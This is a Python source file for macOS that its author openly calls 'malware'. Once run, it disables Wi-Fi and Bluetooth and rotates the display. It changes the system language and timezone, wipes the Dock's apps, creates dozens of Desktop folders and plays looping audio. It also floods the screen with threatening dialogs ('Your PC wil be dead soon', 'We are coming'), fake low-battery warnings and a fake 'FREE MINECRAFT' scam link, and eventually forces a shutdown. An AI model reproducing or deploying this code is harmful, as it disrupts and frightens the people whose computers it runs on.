
# NOTE: This python malware CANT delete/rename/move any files inside your computer.
# This program only can open system programs (like notes.app) and cant open installed programs.

# SOURCE CODE
# Provived by Tuseloryy
# Made by Tuseloryy
# My social: https://tuseloryy.carrd.co
# TPD v2.2
# Python 3.12

import webbrowser
import subprocess
import pygame
import os
import sys
import random
import pyautogui
import getpass
import re
import threading
import tkinter as tk

# -- path
def resource_path(filename):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, filename)
    return os.path.join(os.path.abspath("."), filename)
# ---------

# -- music pick
mus = [1, 2, 3, 4]
mus_pick = random.choice(mus)

if mus_pick == 1:
    path = resource_path("data/end.mp3")
elif mus_pick == 2:
    path = resource_path("data/end2.mp3")
elif mus_pick == 3:
    path = resource_path("data/dobrota.mp3")
elif mus_pick == 4:
    path = resource_path("data/dobrota.mp3")
else:
    path = resource_path("data/end2.mp3")
# -------------

# ------------------- Apps ------------------------
if os.path.exists("/Applications/Notes.app"):
    path1 = resource_path("/Applications/Notes.app")
else:
    path1 = resource_path("")
if os.path.exists("/Applications/Calculator.app"):
    path2 = resource_path("/Applications/Calculator.app")
else:
    path2 = resource_path("")
if os.path.exists("/Applications/Calendar.app"):
    path3 = resource_path("/Applications/Calendar.app")
else:
    path3 = resource_path("")
if os.path.exists("/Applications/Calendar.app"):
    path4 = resource_path("/Applications/Chess.app")
else:
    path4 = resource_path("")
if os.path.exists("/Applications/Contacts.app"):
    path5 = resource_path("/Applications/Contacts.app")
else:
    path5 = resource_path("")
if os.path.exists("/Applications/DVD Player.app"):
    path6 = resource_path("/Applications/DVD Player.app")
else:
    path6 = resource_path("")
if os.path.exists("/Applications/FaceTime.app"):
    path7 = resource_path("/Applications/FaceTime.app")
else:
    path7 = resource_path("")
if os.path.exists("/Applications/Font Book.app"):
    path8 = resource_path("/Applications/Font Book.app")
else:
    path8 = resource_path("")
if os.path.exists("/Applications/Launchpad.app"):
    path9 = resource_path("/Applications/Launchpad.app")
else:
    path9 = resource_path("")
if os.path.exists("/Applications/Maps.app"):
    path10 = resource_path("/Applications/Maps.app")
else:
    path10 = resource_path("")
if os.path.exists("/Applications/Messages.app"):
    path11 = resource_path("/Applications/Messages.app")
else:
    path11 = resource_path("")
if os.path.exists("/Applications/Notes.app"):
    path12 = resource_path("/Applications/Notes.app")
else:
    path12 = resource_path("")
if os.path.exists("/Applications/QuickTime Player.app"):
    path13 = resource_path("/Applications/QuickTime Player.app")
else:
    path13 = resource_path("")
if os.path.exists("/Applications/Record It.app"):
    path14 = resource_path("/Applications/Record It.app")
else:
    path14 = resource_path("")
if os.path.exists("/Applications/Stickies.app"):
    path15 = resource_path("/Applications/Stickies.app")
else:
    path15 = resource_path("")
if os.path.exists("/Applications/Preview.app"):
    path16 = resource_path("/Applications/Preview.app")
else:
    path16 = resource_path("")
if os.path.exists("/Applications/Photos.app"):
    path17 = resource_path("/Applications/Photos.app")
else:
    path17 = resource_path("")
if os.path.exists("/Applications/App Store.app"):
    path18 = resource_path("/Applications/App Store.app")
else:
    path18 = resource_path("")
if os.path.exists("/Applications/TextEdit.app"):
    path19 = resource_path("/Applications/TextEdit.app")
else:
    path19 = resource_path("")
if os.path.exists("/Applications/Reminders.app"):
    path20 = resource_path("/Applications/Reminders.app")
else:
    path20 = resource_path("")
if os.path.exists("/Applications/Mail.app"):
    path21 = resource_path("/Applications/Mail.app")
else:
    path21 = resource_path("")
if os.path.exists("/Applications/System Preferences.app"):
    path22 = resource_path("/Applications/System Preferences.app")
else:
    path22 = resource_path("")
if os.path.exists("/Applications/iTunes.app"):
    path23 = resource_path("/Applications/iTunes.app")
else:
    path23 = resource_path("")
if os.path.exists("/Applications/Image Capture.app"):
    path24 = resource_path("/Applications/Image Capture.app")
else:
    path24 = resource_path("")
if os.path.exists("/Applications/Safari.app"):
    path25 = resource_path("/Applications/Safari.app")
else:
    path25 = resource_path("")
if os.path.exists("/Applications/iBooks.app"):
    path26 = resource_path("/Applications/iBooks.app")
else:
    path26 = resource_path("")
if os.path.exists("/Applications/Siri.app"):
    path27 = resource_path("")
else:
    path27 = resource_path("")
if os.path.exists("/Applications/Dictionary.app"):
    path28 = resource_path("/Applications/Dictionary.app")
else:
    path28 = resource_path("")
if os.path.exists("/Applications/Utilities/Migration Assistant.app"):
    path29 = resource_path("/Applications/Utilities/Migration Assistant.app")
else:
    path29 = resource_path("")
if os.path.exists("/Applications/Utilities/Boot Camp Assistant.app"):
    path30 = resource_path("/Applications/Utilities/Boot Camp Assistant.app")
else:
    path30 = resource_path("")
if os.path.exists("/Applications/Utilities/Disk Utility.app"):
    path31 = resource_path("/Applications/Utilities/Disk Utility.app")
else:
    path31 = resource_path("")
if os.path.exists("/Applications/Utilities/System Information.app"):
    path32 = resource_path("/Applications/Utilities/System Information.app")
else:
    path32 = resource_path("")
if os.path.exists("/Applications/Utilities/Console.app"):
    path33 = resource_path("/Applications/Utilities/Console.app")
else:
    path33 = resource_path("")
if os.path.exists("/Applications/Utilities/Activity Monitor.app"):
    path34 = resource_path("/Applications/Utilities/Activity Monitor.app")
else:
    path34 = resource_path("")
if os.path.exists("/Applications/Utilities/Audio MIDI Setup.app"):
    path35 = resource_path("/Applications/Utilities/Audio MIDI Setup.app")
else:
    path35 = resource_path("")
if os.path.exists("/Applications/Utilities/Bluetooth File Exchange.app"):
    path36 = resource_path("/Applications/Utilities/Bluetooth File Exchange.app")
else:
    path36 = resource_path("")
if os.path.exists("/Applications/Utilities/Script Editor.app"):
    path37 = resource_path("/Applications/Utilities/Script Editor.app")
else:
    path37 = resource_path("")
if os.path.exists("/Applications/Utilities/Keychain Access.app"):
    path38 = resource_path("/Applications/Utilities/Keychain Access.app")
else:
    path38 = resource_path("")
if os.path.exists("/Applications/Utilities/Terminal.app"):
    path39 = resource_path("/Applications/Utilities/Terminal.app")
else:
    path39 = resource_path("")
if os.path.exists("/Applications/Utilities/AirPort Utility.app"):
    path40 = resource_path("/Applications/Utilities/AirPort Utility.app")
else:
    path40 = resource_path("")
if os.path.exists("/Applications/Utilities/ColorSync Utility.app"):
    path41 = resource_path("/Applications/Utilities/ColorSync Utility.app")
else:
    path41 = resource_path("")
if os.path.exists("/Applications/Utilities/VoiceOver Utility.app"):
    path42 = resource_path("/Applications/Utilities/VoiceOver Utility.app")
else:
    path42 = resource_path("")
if os.path.exists("/Applications/Utilities/Digital Color Meter.app"):
    path43 = resource_path("/Applications/Utilities/Digital Color Meter.app")
else:
    path43 = resource_path("")
if os.path.exists("/Applications/Utilities/Grapher.app"):
    path44 = resource_path("/Applications/Utilities/Grapher.app")
else:
    path44 = resource_path("")
# --------------------------------------------------

# ----- desktops
desk1 = resource_path("data/end.png")
desk2 = resource_path("data/end3.jpeg")
desk3 = resource_path("data/end2.png")
# ------------

# ----- scripts
script = f'''
tell application "Finder"
    set desktop picture to POSIX file "{desk1}"
end tell
'''
script2 = f'''
tell application "Finder"
    set desktop picture to POSIX file "{desk2}"
end tell
'''
script3 = '''
tell application "System Events"
    set visible of every process to false
end tell
'''
script4 = f'''
tell application "Finder"
    set desktop picture to POSIX file "{desk3}"
end tell
'''

position = "left"
position2 = "bottom"
position3 = "right"

ip = "[Error -13: Failed to load IP address. Please try again later.]"
text = "This is the end."
shutdown_timer = 0
count = 1
try:
    username = getpass.getuser()
    pass
except:
    username = "{username}"
    pass
# -------------

# -- displayplacer func --
displayplacer = resource_path("data/./displayplacer")
result = subprocess.run([displayplacer, "list"], capture_output=True, text=True)
match = re.search(r"Screen ID:\s*(\d+)", result.stdout)
display_id = match.group(1)
def turn0():
    subprocess.run([displayplacer, f"id:{display_id} degree:0"])
def turn90():
    subprocess.run([displayplacer, f"id:{display_id} degree:90"])
def turn180():
    subprocess.run([displayplacer, f"id:{display_id} degree:180"])
def turn270():
    subprocess.run([displayplacer, f"id:{display_id} degree:270"])
# -------------------------

# ------ images path
img_path1 = resource_path("data/img1.jpg")
img_path2 = resource_path("data/img2.jpeg")
img_path3 = resource_path("data/img3.jpeg")
img_path4 = resource_path("data/img4.jpeg")
img_path5 = resource_path("data/img5.jpeg")
img_path6 = resource_path("data/img6.jpeg")
img_path7 = resource_path("data/img7.jpeg")
img_path8 = resource_path("data/img8.jpeg")
img_path9 = resource_path("data/img9.jpeg")
img_path10 = resource_path("data/img10.jpg")
img_path11 = resource_path("data/img11.jpg")
# -------------

# --- music play
pygame.mixer.init()
sound = pygame.mixer.Sound(path)

sound.play(loops=100000000)
sound.play(loops=100000000)
sound.play(loops=100000000)
# ------------

# --------- start
def starting():
    pyautogui.hotkey("alt", "command", "d")
    global count
    count += 1
    subprocess.run(["data/./blueutil", "-p", "0"])
    subprocess.run(["networksetup", "-setairportpower", "0", "off"])
    pyautogui.hotkey("alt", "command", "d")
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    pyautogui.hotkey("alt", "command", "d")
    os.system('defaults write NSGlobalDomain AppleLanguages -array "ja"')
    os.system('defaults write /Library/Preferences/.GlobalPreferences.plist TimeZone "America/Los_Angeles"')
    global shutdown_timer
    pyautogui.hotkey("alt", "command", "d")
    shutdown_timer += 1
    if shutdown_timer == 60:
        os.system("osascript -e 'tell app \"System Events\" to shut down'")
    subprocess.run(["open", img_path1])
    os.system('defaults write /Library/Preferences/.GlobalPreferences.plist TimeZone "America/Los_Angeles"')
    pyautogui.hotkey("shift", "command", "3")
    pyautogui.click()
    subprocess.run(
        ["osascript", "-e", 'display notification "Battery: 10% Your pc is dead " with title "Low Battery!!"'])
    subprocess.run(["data/./blueutil", "-p", "0"])
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    os.system("defaults delete com.apple.dock persistent-apps")
    os.system("killall Dock")
    count += 1
    subprocess.run(["networksetup", "-setairportpower", "0", "off"])
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    pyautogui.hotkey("ctrl", "space")
    turn0()
    subprocess.run(["osascript", "-e", 'display notification "Battery: 10% Your pc is dead " with title "Low Battery!!"'])
    count += 1
    subprocess.run(
        ["osascript", "-e", 'display notification "Click here: www.notscam.com" with title "FREE MINECRAFT!!"'])
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    os.system("defaults delete com.apple.dock persistent-apps")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    os.system("killall Dock")
    count += 1
    pyautogui.hotkey("alt", "command", "d")
    subprocess.run(["osascript", "-e", 'display notification "Battery: 10% Your pc is dead " with title "Low Battery!!"'])
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    os.system('defaults write NSGlobalDomain AppleLanguages -array "ja"')
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    pyautogui.hotkey("option", "command", "d")
    count += 1
    turn90()
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    os.system('defaults write NSGlobalDomain AppleLanguages -array "ja"')
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    os.system('defaults write /Library/Preferences/.GlobalPreferences.plist TimeZone "America/Los_Angeles"')
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.run(["osascript", "-e", script])
    subprocess.run(
        ["osascript", "-e", 'display notification "Click here: www.notscam.com" with title "FREE MINECRAFT!!"'])
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    pyautogui.hotkey("ctrl", "option", "command", "8")
    subprocess.run(["open", img_path2])
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    pyautogui.hotkey("option", "command", "f5")
    turn180()
    pyautogui.hotkey("ctrl", "space")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.run(["open", path1])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    os.system(f'defaults write com.apple.dock orientation -string {position}')
    os.system('killall Dock')
    count += 1
    subprocess.run(["data/./blueutil", "-p", "0"])
    turn0()
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    os.system('defaults write NSGlobalDomain AppleLanguages -array "ja"')
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.run(["open", path2])
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    pyautogui.hotkey("ctrl", "option", "command", "8")
    os.system('defaults write NSGlobalDomain AppleLanguages -array "ja"')
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    os.system("osascript -e 'set volume output volume 65'")
    count += 1
    subprocess.run(
        ["osascript", "-e", 'display notification "Battery: 10% Your pc is dead " with title "Low Battery!!"'])
    turn270()
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    os.system('defaults write NSGlobalDomain AppleLanguages -array "ja"')
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.run(["open", path3])
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    os.system('defaults write NSGlobalDomain AppleLanguages -array "ja"')
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    os.system("osascript -e 'set volume output volume 65'")
    pyautogui.hotkey("ctrl", "option", "command", "8")
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    count += 1
    turn180()
    subprocess.run(
        ["osascript", "-e", 'display notification "Battery: 10% Your pc is dead " with title "Low Battery!!"'])
    subprocess.run(["data/./blueutil", "-p", "0"])
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.run(["open", img_path3])
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    os.system('defaults write NSGlobalDomain AppleLanguages -array "zh"')
    os.system("defaults delete com.apple.dock persistent-apps")
    os.system("killall Dock")
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.run(
        ["osascript", "-e", 'display notification "Click here: www.notscam.com" with title "FREE MINECRAFT!!"'])
    os.system('defaults write NSGlobalDomain AppleLanguages -array "zh"')
    count += 1
    turn180()
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    os.system("osascript -e 'set volume output volume 65'")
    pyautogui.hotkey("ctrl", "option", "command", "8")
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    os.system('defaults write NSGlobalDomain AppleLanguages -array "zh"')
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    pyautogui.hotkey("ctrl", "option", "command", "8")
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    os.system("osascript -e 'set volume output volume 65'")
    count += 1
    turn0()
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    os.system('defaults write NSGlobalDomain AppleLanguages -array "zh"')
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    pyautogui.hotkey("alt", "command", "d")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.run(["open", path4])
    subprocess.run(["networksetup", "-setairportpower", "0", "off"])
    count += 1
    turn270()
    subprocess.run(
        ["osascript", "-e", 'display notification "Battery: 10% Your pc is dead " with title "Low Battery!!"'])
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    pyautogui.hotkey("command", "tab")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    os.system("osascript -e 'set volume output volume 65'")
    count += 1
    turn90()
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    pyautogui.hotkey("ctrl", "option", "command", "8")
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.run(
        ["osascript", "-e", 'display notification "Click here: www.notscam.com" with title "FREE MINECRAFT!!"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.run(["open", path5])
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    turn0()
    pyautogui.hotkey("ctrl", "option", "command", "8")
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    pyautogui.hotkey("option", "command", "d")
    os.system('defaults write NSGlobalDomain AppleLanguages -array "zh"')
    os.system("osascript -e 'set volume output volume 65'")
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.run(["open", path6])
    subprocess.run(["data/./blueutil", "-p", "0"])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.run(["open", path7])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    os.system("defaults delete com.apple.dock persistent-apps")
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    os.system("killall Dock")
    pyautogui.hotkey("ctrl", "option", "command", "8")
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.run(["open", path8])
    subprocess.run(
        ["osascript", "-e", 'display notification "Battery: 10% Your pc is dead " with title "Low Battery!!"'])
    os.system("osascript -e 'set volume output volume 65'")
    count += 1
    turn90()
    subprocess.run(
        ["osascript", "-e", 'display notification "Click here: www.notscam.com" with title "FREE MINECRAFT!!"'])
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.run(["open", img_path4])
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    os.system("osascript -e 'set volume output volume 65'")
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.run(["open", path9])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.run(["open", path10])
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    pyautogui.hotkey("ctrl", "option", "command", "8")
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    os.system("osascript -e 'set volume output volume 65'")
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.run(["open", img_path5])
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    os.system("defaults delete com.apple.dock persistent-apps")
    count += 1
    subprocess.run(
        ["osascript", "-e", 'display notification "Click here: www.notscam.com" with title "FREE MINECRAFT!!"'])
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    os.system("killall Dock")
    count += 1
    subprocess.run(["data/./blueutil", "-p", "0"])
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.run(
        ["osascript", "-e", 'display notification "Battery: 10% Your pc is dead " with title "Low Battery!!"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    os.system('defaults write NSGlobalDomain AppleLanguages -array "zh"')
    os.system("osascript -e 'set volume output volume 65'")
    count += 1
    turn270()
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    pyautogui.hotkey("f11")
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    pyautogui.hotkey("command", "tab")
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    pyautogui.hotkey("ctrl", "option", "command", "8")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    pyautogui.hotkey("ctrl", "space")
    pyautogui.hotkey("ctrl", "option", "command", "8")
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    pyautogui.hotkey("command", "q")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    pyautogui.hotkey("command", "n")
    pyautogui.hotkey("ctrl", "option", "command", "8")
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    pyautogui.hotkey("command", "p")
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.run(["open", path11])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    os.system(f'defaults write com.apple.dock orientation -string {position2}')
    os.system('defaults write NSGlobalDomain AppleLanguages -array "zh"')
    count += 1
    subprocess.run(["data/./blueutil", "-p", "0"])
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    os.system('killall Dock')
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    turn90()
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    os.system("defaults delete com.apple.dock persistent-apps")
    os.system("killall Dock")
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    os.system("osascript -e 'set volume output volume 65'")
    pyautogui.hotkey("alt", "command", "d")
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.run(["open", path13])
    pyautogui.hotkey("ctrl", "option", "command", "8")
    subprocess.run(
        ["osascript", "-e", 'display notification "Click here: www.notscam.com" with title "FREE MINECRAFT!!"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.run(["open", path14])
    pyautogui.hotkey("ctrl", "option", "command", "8")
    count += 1
    os.mkdir(f"/Users/{username}/Desktop/END{count}")
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    os.system("osascript -e 'set volume output volume 65'")
    pyautogui.hotkey("ctrl", "option", "command", "8")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.run(["open", img_path6])
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    pyautogui.hotkey("ctrl", "option", "command", "8")
    os.system('defaults write NSGlobalDomain AppleLanguages -array "zh"')
    subprocess.run(["open", path15])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    pyautogui.hotkey("ctrl", "space")
    subprocess.run(["open", img_path7])
    subprocess.run(["open", path16])
    os.system("osascript -e 'set volume output volume 65'")
    pyautogui.hotkey("command", "space")
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    pyautogui.hotkey("f11")
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.run(["open", path17])
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    subprocess.run(["open", path18])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
    os.system("osascript -e 'set volume output volume 65'")
    pyautogui.hotkey("option", "command", "8")
    subprocess.run(["networksetup", "-setairportpower", "0", "off"])
    os.system("osascript -e 'set volume output volume 65'")
    subprocess.Popen(["osascript", "-e", f'display dialog "Your IP: {ip} We are coming :)"'])
    pyautogui.hotkey("ctrl", "space")
    subprocess.run(
        ["osascript", "-e", 'display notification "Click here: www.notscam.com" with title "FREE MINECRAFT!!"'])
    subprocess.Popen(["osascript", "-e", f'tell application "System Events" to keystroke "{text}"'])
    subprocess.Popen(["osascript", "-e", f'display dialog "Hello, {username} Your PC wil be dead soon :)"'])
